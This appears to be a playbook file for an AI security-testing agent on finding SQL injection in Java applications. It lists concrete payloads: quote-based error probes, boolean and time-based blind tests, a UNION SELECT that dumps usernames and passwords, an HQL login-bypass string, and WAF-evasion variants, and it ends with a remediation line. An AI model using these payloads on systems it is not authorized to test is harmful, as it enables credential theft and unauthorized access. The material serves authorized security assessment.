# SQL injection (Java)

Java apps build SQL via JDBC string concatenation (`"... WHERE id="+id`) or
Hibernate **HQL/JPQL**. Test every GET/POST parameter, form field, and JSON field.

1. **Find inputs**: `browser_get_form_fields`, plus parameters in `http_history`.
2. **Error-based**: inject a single quote `'` (`browser_type`+`browser_click`+
   `browser_wait_for`, or `http_request`). Look for Java/JDBC errors in the
   response: `java.sql.SQLException`, `org.hibernate.QueryException`,
   `org.hibernate.hql.internal...`, `com.mysql.jdbc`,
   `org.postgresql.util.PSQLException`, `ORA-01756`, `Unterminated string literal`.
   An error ⇒ injectable.
3. **Boolean-blind**: compare `id=1 AND 1=1` vs `id=1 AND 1=2` (and quoted
   `1' AND '1'='1`). Differential `length`/status ⇒ blind SQLi. Sweep both with one
   `http_fuzz` (marker on the value) and read the length deltas.
4. **UNION**: column count with `' ORDER BY n-- -` (`http_fuzz` payloads `1..20`),
   then `' UNION SELECT username,password FROM users-- -`. Read dumped rows from
   the body.
5. **HQL/JPQL** differs: no UNION/cross-entity reads — bypass auth with boolean
   `' OR '1'='1`, or break the entity field; the Hibernate error text confirms the
   sink even when blind.
6. Prefer `http_request`/`from_flow` for single tampered requests; `http_fuzz`
   with `match_regex` on the error strings above to sweep payloads and auto-flag.
7. **Time-based blind** (identical length/status): compare
   `id=1 AND SLEEP(5)-- -` / `pg_sleep(5)` / `WAITFOR DELAY '0:0:5'` against a
   `SLEEP(0)` baseline in ONE `http_fuzz` and read the `timeMs` column — a
   ~5s delta confirms injection even when nothing else differs.
8. **WAF-bypassed variants** if plain payloads are blocked: inline comments
   (`UNI/**/ON SEL/**/ECT`), case toggling (`uNIoN sELECT`), whitespace-free
   forms (`UNION(SELECT(1),(2))`). Sweep the variant list with `http_fuzz`
   using the same error/length/`match_regex` signals as the earlier steps.

Evidence: the injected request + the SQL/Hibernate error or dumped data.
Remediation: `PreparedStatement` with bind parameters; JPA/Hibernate parameterized
queries (`:param`, `setParameter`); never concatenate input into SQL/HQL.
